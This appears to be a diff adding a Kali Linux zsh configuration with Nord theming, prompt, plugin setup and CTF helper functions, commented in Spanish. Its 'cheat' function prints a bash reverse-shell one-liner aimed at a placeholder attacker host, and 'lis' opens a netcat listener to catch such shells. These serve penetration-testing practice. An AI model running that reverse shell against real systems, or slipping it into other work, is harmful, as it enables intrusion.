@@ -1,0 +1,195 @@
+# ~/.zshrc — kali-nordic (arranque < 150 ms, render del prompt < 30 ms)
+typeset -U path
+path=(~/.local/bin /usr/local/bin $path)
+export EDITOR=nano VISUAL=nano
+
+# ── Historial ────────────────────────────────────────────────────────────────
+HISTFILE="$HOME/.cache/nordic/zsh-history"
+HISTSIZE=10000
+SAVEHIST=10000
+setopt share_history hist_ignore_all_dups hist_reduce_blanks auto_cd interactive_comments
+unsetopt beep
+setopt prompt_subst
+
+# ── Estado TARGET / VPN (lectura barata, ~0 ms, export a nuevas shells) ──────
+typeset -g TARGET TARGET_NAME VPN_IP
+__nordic_read_state() {
+    local f="$HOME/.cache/nordic/target"
+    [ -r /run/nordic/target ] && f=/run/nordic/target
+    if [ -s "$f" ]; then
+        local line="$1"
+        read -r line < "$f"
+        TARGET="${line%%|*}"
+        TARGET_NAME="${line#*|}"
+        [ "$TARGET_NAME" = "$line" ] && TARGET_NAME=""
+    else
+        TARGET=""; TARGET_NAME=""
+    fi
+    VPN_IP=""
+    if command -v ip >/dev/null 2>&1; then
+        local dev
+        dev=$(ip -o link 2>/dev/null | awk -F': ' '{print $2}' | grep -Eo '^(tun|wg|tailscale|ppp)[a-zA-Z0-9]*' | head -1)
+        [ -n "$dev" ] && VPN_IP=$(ip -4 -o addr show dev "$dev" 2>/dev/null | awk 'NR==1{print $4}' | cut -d/ -f1)
+    fi
+}
+__nordic_hook() { __nordic_read_state; }
+autoload -Uz add-zsh-hook
+add-zsh-hook precmd __nordic_hook
+
+# ── Prompt (doble línea, iconos Nerd Font, calavera Frost/rojo Aurora en root) ─
+# ── Prompt: powerlevel10k *Nord Frost* (config en ~/.p10k.zsh) ────
+# El precmd de __nordic_hook (registrado arriba) refresca $TARGET/$VPN_IP antes
+# de que los segmentos custom de p10k (nordic_target/nordic_vpn) se rendericen.
+if [ -r "$HOME/.powerlevel10k/powerlevel10k.zsh-theme" ]; then
+    [ -r "$HOME/.p10k.zsh" ] && source "$HOME/.p10k.zsh"
+    source "$HOME/.powerlevel10k/powerlevel10k.zsh-theme"
+else
+    # fallback minimal si p10k no está
+    PROMPT='%F{#88C0D0} %n %F{#81A1C1}%4~%f ❯ '
+fi
+
+# ── Completions ──────────────────────────────────────────────────────────────
+autoload -Uz compinit
+compinit -d "$HOME/.cache/nordic/zcompdump"
+zstyle ':completion:*' menu select
+zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
+
+# ── Autosugerencias estilo fish (fantasma del comando anterior con ese inicio) ─
+# Aceptación: → o Fin aceptan la sugerencia entera; escribir encima la descarta.
+for _auto in /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh \
+             /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh; do
+    [ -r "$_auto" ] && { source "$_auto"; break; }
+done 2>/dev/null; unset _auto
+ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#667083'  # fantasma gris Nord
+ZSH_AUTOSUGGEST_STRATEGY=(history)
+
+# ── Historial por prefijo: ↑ recupera el último comando que EMPIECE igual ─────
+autoload -Uz up-line-or-beginning-search down-line-or-beginning-search
+zle -N up-line-or-beginning-search
+zle -N down-line-or-beginning-search
+bindkey '^[OA' up-line-or-beginning-search   2>/dev/null
+bindkey '^[OB' down-line-or-beginning-search 2>/dev/null
+bindkey '^[[A' up-line-or-beginning-search   2>/dev/null
+bindkey '^[[B' down-line-or-beginning-search 2>/dev/null
+
+# fzf (Ctrl-R)
+if command -v fzf >/dev/null 2>&1; then
+    source /usr/share/doc/fzf/examples/key-bindings.zsh 2>/dev/null
+fi
+command -v zoxide >/dev/null 2>&1 && eval "$(zoxide init zsh)"
+
+# ── Terminator nordic aliases + herramientas CTF ────────────────────────────
+alias cat='bat --style=plain --theme=Nord'
+alias ls='eza --icons --group-directories-first'
+alias ll='eza --icons -la --group-directories-first --git'
+alias fd=fdfind
+alias bat=batcat
+alias grep='grep --color=auto'
+alias lessm='less -R'
+
+alias myip="ip -brief addr show && echo ' externa:' \$(curl -s --max-time 3 ifconfig.me)"
+alias ports="ss -tulnp"
+alias serve="python3 -m http.server 8000"
+# atajos de aceptación de sugerencia (→ y End ya vienen por defecto del plugin)
+
+
+checkvpn() {
+    local dev
+    dev=$(ip -o link 2>/dev/null | awk -F': ' '{print $2}' | grep -E '^(tun|wg|tailscale|ppp)' | head -1)
+    if [ -n "$dev" ]; then
+        echo " VPN activa en ${dev}: $(ip -4 -o addr show dev "$dev" 2>/dev/null | awk 'NR==1{print $4}')"
+    else
+        echo " VPN off"
+    fi
+}
+alias vpn=checkvpn
+
+ctfinit() {
+    if [ -z "$1" ]; then
+        echo "uso: ctfinit <nombre> [IP]"
+        return 1
+    fi
+    local name="$1"
+    mkdir -p "$HOME/ctf/$name"/{nmap,web,exploits,loot,notes}
+    echo " ~/ctf/$name listo (nmap · web · exploits · loot · notes)"
+    [ -n "$2" ] && settarget "$2" "${name}"
+    [ -f "$HOME/ctf/$name/notes/README.md" ] || echo "# ${name} — notas de sesión" > "$HOME/ctf/$name/notes/README.md"
+}
+lis() {
+    [ -n "$1" ] || { echo "uso: lis <puerto>"; return 1; }
+    echo " listener nc nvnp en $1 "
+    rlwrap nc -lvnp "$1"
+}
+extract() {
+    case "$1" in
+        *.tar.bz2|*.tbz2) tar xjf "$1" ;;
+        *.tar.gz|*.tgz)   tar xzf "$1" ;;
+        *.tar.xz)         tar xJf "$1" ;;
+        *.zip)            unzip "$1" ;;
+        *.7z)             7z x "$1" ;;
+        *.rar)            unrar x "$1" ;;
+        *) echo " formato no soportado: $1" ;;
+    esac
+}
+cheat() {
+    case "$1" in
+        nmap)  echo "nmap -sVC -p- $TARGET" ;;
+        http)  echo "gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt" ;;
+        smb)   echo "nmap --script smb-vuln* -p 139,445 $TARGET" ;;
+        revsh) echo "bash -i >& /dev/tcp/<attacker>/<port> 0>&1" ;;
+        *)     echo "temas: nmap · http · smb · revsh" ;;
+    esac
+}
+
+# ── nordic-typeip: F1/F2 escriben la IP EXACTAMENTE en el cursor ──────────
+# F1 = IP propia (prioriza la VPN: tun*/wg*/tailscale*/ppp*; si no, red local)
+# F2 = IP de la víctima (settarget)
+# Va por bindkey sobre las secuencias de terminfo (F1=\EOP F2=\EOQ en kitty/
+# xterm-256color; variantes rxvt incluidas), funciona en cualquier terminal y
+# usa zle insert_string: la IP cae en el punto exacto del cursor del buffer.
+typeip_widget() {
+    local ip
+    ip=$(nordic-typeip print "$1" 2>/dev/null) || { zle -M "  sin IP para F$2"; return 0; }
+    [[ -n "$ip" ]] || { zle -M "  sin IP para F$2"; return 0; }
+    zle insert_string "$ip"
+}
+nordic-typeip-local()  { typeip_widget local  1; }
+nordic-typeip-target() { typeip_widget target 2; }
+zle -N nordic-typeip-local
+zle -N nordic-typeip-target
+# kitty/putty-style: \EOP..\EOT · rxvt: \E[11~..\E[14~ (modos keypad cubiertos)
+for _seq _fn in \
+    $'\eOP' nordic-typeip-local \
+    $'\eOQ' nordic-typeip-target \
+    $'\e[11~' nordic-typeip-local \
+    $'\e[12~' nordic-typeip-target \
+    $'\e[13~' nordic-typeip-target \
+    $'\e[14~' nordic-typeip-local \
+    $'\e[1;3P' nordic-typeip-local \
+    $'\e[1;3Q' nordic-typeip-target; do
+    bindkey "$_seq" "$_fn" 2>/dev/null
+done 2>/dev/null
+unset _seq _fn
+
+# ── Resaltado de sintaxis en vivo (SIEMPRE va al final del zshrc) ──────────────
+# comandos válidos → verde Frost · inexistentes → rojo Aurora ·
+# opciones (params con -/--) → violeta Aurora · strings → amarillo ·
+# paths → cian · comentarios → gris
+for _hl in /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh \
+           /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh; do
+    [ -r "$_hl" ] && { source "$_hl"; break; }
+done 2>/dev/null; unset _hl
+typeset -A ZSH_HIGHLIGHT_STYLES
+ZSH_HIGHLIGHT_STYLES[default]='fg=#ECEFF4'
+ZSH_HIGHLIGHT_STYLES[command]='fg=#A3BE8C'
+ZSH_HIGHLIGHT_STYLES[builtin]='fg=#88C0D0'
+ZSH_HIGHLIGHT_STYLES[function]='fg=#88C0D0'
+ZSH_HIGHLIGHT_STYLES[alias]='fg=#88C0D0'
+ZSH_HIGHLIGHT_STYLES[unknown-token]='fg=#BF616A,bold'
+ZSH_HIGHLIGHT_STYLES[path]='fg=#88C0D0'
+ZSH_HIGHLIGHT_STYLES[single-quoted-argument]='fg=#EBCB8B'
+ZSH_HIGHLIGHT_STYLES[double-quoted-argument]='fg=#EBCB8B'
+ZSH_HIGHLIGHT_STYLES[single-hyphen-option]='fg=#B48EAD'
+ZSH_HIGHLIGHT_STYLES[double-hyphen-option]='fg=#B48EAD'
+ZSH_HIGHLIGHT_STYLES[comment]='fg=#667083'
+ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets)
